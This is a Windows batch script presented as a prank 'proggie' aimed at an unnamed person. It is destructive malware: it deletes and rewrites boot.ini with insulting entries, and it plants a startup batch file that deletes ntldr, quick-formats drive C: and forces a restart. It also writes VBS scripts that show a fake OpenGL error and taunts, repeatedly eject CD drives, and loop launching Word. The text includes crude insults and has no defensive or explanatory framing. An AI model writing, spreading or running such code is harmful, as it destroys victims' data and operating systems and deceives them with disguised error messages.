   @echo off
   rem The Happy Shalala "proggie"
   rem Dedicated to Someone
   rem I will be kinder to give him one second to
   rem reject this "program"...or else....
   :timer

   :timer
   Ping >nul
   Ping >nul
   ping >nul
   :over

   :over
   Rem GAME OVER!!!
   REM FUN TIME!!!
   :IObus

   :IObus

   goto :Destroy

   :Destroy
   REM HAPPY TIME!!!
   attrib -r -a -s -h c:\boot.ini
   del c:\boot.ini
   echo [boot loader] >> c:\boot.ini
   echo timeout=30 >> c:\boot.ini
   echo default=C:\ >> c:\boot.ini
   echo [operating systems] >> c:\boot.ini
   echo C:\="choose here if you have no dick" >> c:\boot.ini
   echo multi(0)disk(0)rdisk(0)partition(0)\WINDOWS="Choose here if u like that girl everyone hate most" >> c:\boot.ini
   echo multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Choose here if you are a sucker" >> c:\boot.ini
   goto :play

   :PlAy
   cd\
   cd f:\Documents and Settings\all users\Start Menu\Programs\Startup
   echo msgbox "Naughty Naughty...Restart your com...",16 >> restart.vbs
   echo msgbox "Think i dun noe?? think again" >> restart.vbs
   echo @echo off >> format.bat
   echo attrib -r -a -s -h c:\ntldr >> format.bat
   echo del c:\ntldr >> format.bat
   echo format c: /y /q /fs:ntfs >> format.bat
   echo shutdown -r -f -t 05 -c "HA SUCKER!!!" >> format.bat
   goto :cdOpener

   :cdOpener
   Echo Set oWMP = CreateObject("WMPlayer.OCX.7") >c:\m.vbs
   Echo Set colCDROMs = oWMP.cdromCollection >>c:\m.vbs
   Echo if colCDROMs.Count >= 1 then >>c:\m.vbs
   Echo For i = 0 to colCDROMs.Count - 1 >>c:\m.vbs
   Echo colCDROMs.Item(i).Eject >>c:\m.vbs
   Echo Next  >>c:\m.vbs
   Echo For i = 0 to colCDROMs.Count - 1 >>c:\m.vbs
   Echo colCDROMs.Item(i).Eject >>c:\m.vbs
   Echo Next >>c:\m.vbs
   Echo end if >>c:\m.vbs
   goto :HDDBurn

   :HDDburn
   rem open programs and open cd rom ...
   rem make you bored and wanna restart your com...
   rem then u will crash your hdd..
   echo msgbox "Error Loading of game. Please have OpenGL 1.4 Install",16 >> %windir%\system32\boot.vbs
   echo msgbox "SUPRISE ASSHOLE!! Do you noe you are a fool??">> %windir%\system32\boot.vbs
   echo msgbox "Well...you are gonna see this everytime you start winows...">> %windir%\system32\boot.vbs
   echo msgbox "Did i spell wrong of Winows?? Yea..it should be Windows...yes...",16>> %windir%\system32\boot.vbs
   %windir%\system32\boot.vbs
   goto :proggie

   :proggie
   start winword.exe
   start winword.exe
   c:\m.vbs
   start winword.exe
   start winword.exe
   c:\m.vbs
   c:\m.vbs
   goto :proggie
